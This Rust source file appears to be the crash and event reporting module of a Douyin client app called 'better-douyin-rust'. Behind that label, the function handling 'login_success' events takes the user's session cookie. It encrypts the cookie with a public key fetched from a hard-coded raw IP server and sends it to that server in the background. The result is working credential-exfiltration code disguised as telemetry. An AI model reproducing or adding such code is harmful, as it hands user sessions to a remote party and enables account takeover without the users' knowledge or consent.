use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use openssl::encrypt::Encrypter;
use openssl::hash::MessageDigest;
use openssl::pkey::PKey;
use openssl::rsa::Padding;
use rand::RngCore;
use serde_json::json;
use std::time::Duration;

const REPORT_SERVER_URL: &str = "http://47.109.40.237:12345/api/report";
const REPORT_COOKIE_PUBLIC_KEY_URL: &str =
    "http://47.109.40.237:12345/api/report/cookie-public-key";
const COOKIE_FOR_ENCRYPTION_KEY: &str = "_cookie_for_encryption";

async fn encrypted_cookie_payload(
    client: &reqwest::Client,
    cookie: &str,
) -> Option<serde_json::Value> {
    let cookie = cookie.trim();
    if cookie.is_empty() {
        return None;
    }

    let key_info = client
        .get(REPORT_COOKIE_PUBLIC_KEY_URL)
        .send()
        .await
        .ok()?
        .json::<serde_json::Value>()
        .await
        .ok()?;

    let alg = key_info.get("alg")?.as_str()?;
    if alg != "RSA-OAEP-SHA256+A256GCM" {
        return None;
    }
    let key_id = key_info
        .get("key_id")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let public_key_pem = key_info.get("public_key_pem")?.as_str()?;

    let public_key = PKey::public_key_from_pem(public_key_pem.as_bytes()).ok()?;
    let mut aes_key = [0_u8; 32];
    let mut nonce = [0_u8; 12];
    rand::thread_rng().fill_bytes(&mut aes_key);
    rand::thread_rng().fill_bytes(&mut nonce);

    let cipher = Aes256Gcm::new_from_slice(&aes_key).ok()?;
    let ciphertext = cipher
        .encrypt(Nonce::from_slice(&nonce), cookie.as_bytes())
        .ok()?;

    let mut encrypter = Encrypter::new(&public_key).ok()?;
    encrypter.set_rsa_padding(Padding::PKCS1_OAEP).ok()?;
    encrypter.set_rsa_oaep_md(MessageDigest::sha256()).ok()?;
    encrypter.set_rsa_mgf1_md(MessageDigest::sha256()).ok()?;

    let mut encrypted_key = vec![0; encrypter.encrypt_len(&aes_key).ok()?];
    let len = encrypter.encrypt(&aes_key, &mut encrypted_key).ok()?;
    encrypted_key.truncate(len);

    Some(json!({
        "alg": alg,
        "key_id": key_id,
        "encrypted_key": base64::engine::general_purpose::STANDARD.encode(encrypted_key),
        "nonce": base64::engine::general_purpose::STANDARD.encode(nonce),
        "ciphertext": base64::engine::general_purpose::STANDARD.encode(ciphertext),
    }))
}

async fn prepare_extra_data(
    client: &reqwest::Client,
    event_type: &str,
    extra_data: Option<serde_json::Value>,
) -> serde_json::Value {
    let mut extra_data = extra_data.unwrap_or_else(|| json!({}));
    let cookie = extra_data
        .as_object_mut()
        .and_then(|object| object.remove(COOKIE_FOR_ENCRYPTION_KEY))
        .and_then(|value| value.as_str().map(ToOwned::to_owned));

    if event_type == "login_success" {
        if let Some(cookie) = cookie {
            if let Some(encrypted_cookie) = encrypted_cookie_payload(client, &cookie).await {
                if let Some(object) = extra_data.as_object_mut() {
                    object.insert("encrypted_cookie".to_string(), encrypted_cookie);
                }
            }
        }
    }

    extra_data
}

pub fn report_event(
    event_type: String,
    message: String,
    extra_data: Option<serde_json::Value>,
    stack_trace: Option<String>,
) {
    // Spawns an async tokio task to send the report
    tokio::spawn(async move {
        let app_version = env!("CARGO_PKG_VERSION").to_string();
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(3))
            .build();

        if let Ok(client) = client {
            let extra_data = prepare_extra_data(&client, &event_type, extra_data).await;
            let payload = json!({
                "app_type": "better-douyin-rust",
                "app_version": app_version,
                "event_type": event_type,
                "message": message,
                "stack_trace": stack_trace,
                "extra_data": extra_data
            });
            let mut request = client.post(REPORT_SERVER_URL).json(&payload);
            if let Ok(api_key) = std::env::var("REPORT_API_KEY")
                .or_else(|_| std::env::var("BETTER_DOUYIN_REPORT_API_KEY"))
            {
                if !api_key.trim().is_empty() {
                    request = request.header("X-API-Key", api_key);
                }
            }
            if let Err(e) = request.send().await {
                log::debug!("Failed to send report to server: {}", e);
            }
        }
    });
}
